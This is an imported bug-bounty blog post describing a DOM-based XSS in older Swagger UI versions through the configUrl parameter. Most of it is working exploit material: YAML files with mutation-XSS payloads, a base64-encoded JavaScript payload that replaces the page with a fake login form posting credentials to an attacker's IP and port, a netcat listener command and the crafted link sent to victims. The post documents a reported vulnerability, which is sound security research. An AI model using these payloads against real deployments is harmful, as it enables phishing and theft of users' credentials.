---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-12-18_how-i-was-able-to-steal-users-credentials-via-swagger-ui-dom-xss.md
original_filename: 2022-12-18_how-i-was-able-to-steal-users-credentials-via-swagger-ui-dom-xss.md
title: How I was able to steal users credentials via Swagger UI DOM-XSS
category: documents
detected_topics:
- xss
- idor
- command-injection
- rate-limit
tags:
- imported
- documents
- xss
- idor
- command-injection
- rate-limit
language: en
raw_sha256: 331910975cb97b010f95a658bb66408e60d185da372190b54fbf2ac415daced8
text_sha256: ace2a74a1e617c7d18a099714dbc60c47c996e3cbccafc55341c1254e2acb787
ingested_at: '2026-06-28T07:32:16Z'
sensitivity: unknown
redactions_applied: true
---

# How I was able to steal users credentials via Swagger UI DOM-XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-12-18_how-i-was-able-to-steal-users-credentials-via-swagger-ui-dom-xss.md
- Source Type: markdown
- Detected Topics: xss, idor, command-injection, rate-limit
- Ingested At: 2026-06-28T07:32:16Z
- Redactions Applied: True
- Raw SHA256: `331910975cb97b010f95a658bb66408e60d185da372190b54fbf2ac415daced8`
- Text SHA256: `ace2a74a1e617c7d18a099714dbc60c47c996e3cbccafc55341c1254e2acb787`


## Content

---
title: "How I was able to steal users credentials via Swagger UI DOM-XSS"
url: "https://medium.com/@M0X0101/how-i-was-able-to-steal-users-credentials-via-swagger-ui-dom-xss-e84255eb8c96"
authors: ["Mohamed Reda (@M0x0101)"]
bugs: ["DOM XSS", "Old components with known vulnerabilities"]
publication_date: "2022-12-18"
added_date: "2022-12-20"
source: "pentester.land/writeups.json"
original_index: 1764
scraped_via: "browseros"
---

# How I was able to steal users credentials via Swagger UI DOM-XSS

1

How I was able to steal users credentials via Swagger UI DOM-XSS
Mohamed reda
Follow
4 min read
·
Dec 18, 2022

566

10

Press enter or click to view image in full size
XSS_alert_cookie

Hello guys, today I’m gonna explain how i got DOM-XSS from Swagger-UI and exploit it to make HTML and JAVASCRIPT injections to create a realistic fake login.

first lets take a look at Swagger UI :-)

Swagger UI is a collection of HTML, Javascript, and CSS assets that dynamically generate documentation from a Swagger-compliant API. It provides users with interactive documentation, client SDK generation, and more.

I started to hunting as usual by doing subdomain enumeration for a public program lets say redirect.com

i found that subdomain “api.redirect.com”

wappalyzer said it used Swagger UI so i make some search about it and it’s vulnerabilities ,i found that Swagger UI affected with the XSS

from versions 3.14.1 to 3.37.0

the vulnerability happen because it get URL to your JSON with path to YAML and render it with payload

JSON code:

{
  "url": "https://m0x0101.github.io/lol/test.yaml",
  "urls": [
  {
  "url": "https://m0x0101.github.io/lol/test.yaml",
  "name": "Foo"
  }
  ]
}

and YAML code:

swagger: '2.0'
info:
  title: XSS Attack BY M0X0101
  description: |
  <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
  version: production
basePath: /JSSResource/
produces:
  - application/xml
  - application/json
consumes:
  - application/xml
  - application/json
security:
  - basicAuth: []
paths:
  /M0X0101:
  get:
  responses:
  '200':
  description: No response was specified
  tags:
  - M0X0101_XSS_D
  operationId: findAccounts
  summary: Finds all accounts
  '/hack/hachid/{id}':
  delete:
  parameters:
  - description: |
  <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
  format: int64
  in: path
  name: id
  required: true
  type: integer
  responses:
  '200':
  description: No response was specified

so i used that YAML and JSON to get alert with full URL

“https://api.redirect.com/swagger/index.html?configUrl=https://m0x0101.github.io/lol/test.json”

Press enter or click to view image in full size

at this point i just was like

Press enter or click to view image in full size

so i directly reported it but unfortunately that was the response from the team

Press enter or click to view image in full size

I tried to find any Auth function or login, sing-up page, but i found nothing

so i start to think in another scenario

i tried to use HTML injection, JS to make fake login page to get credential from user

Get Mohamed reda’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

so the normal code is

<form action=http://IP:PORT>Username:<br>
<input type=”username” name=”username”></br>Password=***REDACTED***
<input type=”username” name=”password”></br><br>
<input type=”submit” value=”Login”></br>

but in our scenario we inject in img tag so we need to store code in “id” as base64 encoded

and use eval function to execute atob function to decode code from base64

eval(atob(this.id))
document.body.innerHTML=''; 
var a=document.createElement('form');
a.action="http://IP:PORT";
a.method='POST';
a.innerHTML='<center>Username: <input type="text" name="userName"><br>Password=***REDACTED*** type="password" name="pwd"><br><input type="submit" value="Login"></center>'; 
document.body.appendChild(a);"'

so lets encode it and put it in “id”

ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovL0lQOlBPUlQiO2EubWV0aG9kPSdQT1NUJzthLmlubmVySFRNTD0nPGNlbnRlcj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==
<img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovL0lQOlBPUlQiO2EubWV0aG9kPSdQT1NUJzthLmlubmVySFRNTD0nPGNlbnRlcj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==' onerror='eval(atob(this.id))'>

so now put the final payload to our YAML file

swagger: '2.0'
info:
  title: XSS Attack BY M0X0101
  description: |
  <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovL0lQOlBPUlQiO2EubWV0aG9kPSdQT1NUJzthLmlubmVySFRNTD0nPGNlbnRlcj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==' onerror='eval(atob(this.id))'>"></form>
  version: production
basePath: /JSSResource/
produces:
  - application/xml
  - application/json
consumes:
  - application/xml
  - application/json
security:
  - basicAuth: []
paths:
  /M0X0101:
  get:
  responses:
  '200':
  description: No response was specified
  tags:
  - M0X0101_XSS_D
  operationId: findAccounts
  summary: Finds all accounts
  '/hack/hachid/{id}':
  delete:
  parameters:
  - description: |
  <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovL0lQOlBPUlQiO2EubWV0aG9kPSdQT1NUJzthLmlubmVySFRNTD0nPGNlbnRlcj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==' onerror='eval(atob(this.id))'>"></form>
  format: int64
  in: path
  name: id
  required: true
  type: integer
  responses:
  '200':
  description: No response was specified

so lets tried gain

put the path of YAML into JSON and put JSON path to parameter “configUrl”

“https://api.redirect.com/swagger/index.html?configUrl=https://m0x0101.github.io/lol/xss_credentials_form.json”

and run net cat at the server to get the credential

nc -lvvp 1337

now every thing is ready just send

“https://api.redirect.com/swagger/index.html?configUrl=https://m0x0101.github.io/lol/xss_credentials_form.json”

to victim and wait until he out the credential

and Bingoooooo

Press enter or click to view image in full size
Hakuna matata
Press enter or click to view image in full size
P3 -> P2

Resources

you can find all scripts and exploit steps here https://github.com/M0x0101/lol

Thanks for reading, hope you learned something new.

for questions or feedback dm me her Twitter and her LinkedIn
